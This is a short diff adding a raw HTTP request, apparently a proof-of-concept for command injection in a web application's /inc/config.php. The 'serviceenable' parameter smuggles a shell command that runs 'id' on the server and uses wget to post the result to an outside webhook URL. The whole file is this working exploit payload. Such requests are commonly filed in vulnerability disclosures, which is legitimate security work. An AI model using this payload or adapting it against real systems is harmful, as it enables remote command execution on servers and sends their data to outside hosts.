@@ -1,0 +1,8 @@
+GET /inc/config.php?id=66&serviceenable=$(wget%20https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b%20--post-data=$(id)) HTTP/1.1
+Host:xxx 
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
